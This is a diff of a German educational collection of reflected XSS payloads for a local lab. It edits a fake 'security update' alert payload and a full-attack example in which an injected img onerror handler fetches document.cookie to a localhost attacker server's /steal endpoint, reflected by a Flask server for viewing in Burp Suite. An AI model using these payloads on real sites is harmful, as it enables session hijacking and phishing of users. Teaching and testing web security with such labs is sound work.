@@ -1,6 +1,6 @@
 # Reflected XSS Payloads - Vollständige Sammlung
 
-⚠️ **NUR FÜR BILDUNGSZWECKE IN KONTROLLIERTEN UMGEBUNGEN!**
+**NUR FÜR BILDUNGSZWECKE IN KONTROLLIERTEN UMGEBUNGEN!**
 
 Diese Datei enthält XSS-Payloads für Testzwecke. Die Payloads sind in zwei Hauptkategorien unterteilt:
 - **Ohne Server**: Funktionieren eigenständig im Browser
@@ -187,7 +187,7 @@ Diese Payloads funktionieren eigenständig im Browser und benötigen keine exter
 ### Fake Update-Hinweis
 
 ```html
-<img src=x onerror="alert('⚠️ Wichtiges Sicherheitsupdate verfügbar! Klicken Sie OK um fortzufahren.')">
+<img src=x onerror="alert('Wichtiges Sicherheitsupdate verfügbar! Klicken Sie OK um fortzufahren.')">
 ```
 
 ---
@@ -375,18 +375,24 @@ Beispiel im Suchfeld:
 
 ---
 
-## 3.6 Beispiel: Vollständiger Angriff
+## 3.6 Beispiel: Vollständiger Angriff mit Flask Server (REFLECTED XSS)
 
 **URL in Browser eingeben:**
 ```
-http://localhost:8080/index.html?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
+http://localhost:5000/?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
 ```
 
 **Was passiert:**
-1. XSS Payload wird ausgeführt
-2. Cookies werden an Attacker Server gesendet
-3. Im Dashboard erscheinen die gestohlenen Cookies
-4. Console zeigt Details an
+1. Flask Server reflektiert den Payload DIREKT in der HTTP Response
+2. Browser erhält HTML mit injiziertem XSS-Code
+3. XSS Payload wird ausgeführt
+4. Cookies werden an Attacker Server gesendet
+5. Im Attacker Terminal erscheinen die gestohlenen Cookies
+
+**WICHTIG für Burp Suite:**
+- Mit dem Flask Server siehst du den XSS-Payload **DIREKT in der HTTP Response**
+- Dies ist **echtes Reflected XSS** (server-seitig)
+- Die alte Version mit SimpleHTTPServer war DOM-based XSS (client-seitig)
 
 **Im Dashboard siehst du:**
 - Alle gestohlenen Cookies
